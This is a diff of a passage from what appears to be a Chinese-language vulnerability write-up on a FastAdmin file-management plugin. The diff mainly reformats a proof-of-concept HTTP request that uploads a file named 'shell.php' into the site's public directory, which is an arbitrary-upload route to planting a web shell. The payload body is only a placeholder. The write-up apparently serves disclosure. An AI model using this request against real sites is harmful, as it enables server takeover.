@@ -176,40 +176,30 @@ https://www.fastadmin.net/store/fileix.html
 
 3.上传poc：
 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-
 ```
-POST /admin/fileix/data?target=%2F HTTP/1.1Host: localhostContent-Length: 1050Origin: http://localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrZmyeAB3SciJDWSTAccept: */*Referer: http://localhostAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=xxxxxxxxConnection: close
-------WebKitFormBoundaryrZmyeAB3SciJDWSTContent-Disposition: form-data; name="upload"; filename="shell.php"Content-Type: application/octet-stream
-code------WebKitFormBoundaryrZmyeAB3SciJDWSTContent-Disposition: form-data; name="action"
-upload------WebKitFormBoundaryrZmyeAB3SciJDWSTContent-Disposition: form-data; name="target"
-/public/------WebKitFormBoundaryrZmyeAB3SciJDWST--
+POST /admin/fileix/data?target=%2F HTTP/1.1
+Host: localhost
+Content-Length: 1050
+Origin: http://localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrZmyeAB3SciJDWST
+Accept: */*
+Referer: http://localhost
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=xxxxxxxx
+Connection: close
+------WebKitFormBoundaryrZmyeAB3SciJDWST
+Content-Disposition: form-data; name="upload"; filename="shell.php"
+Content-Type: application/octet-stream
+code
+------WebKitFormBoundaryrZmyeAB3SciJDWST
+Content-Disposition: form-data; name="action"
+upload
+------WebKitFormBoundaryrZmyeAB3SciJDWST
+Content-Disposition: form-data; name="target"
+/public/
+------WebKitFormBoundaryrZmyeAB3SciJDWST--
 ```
 
 
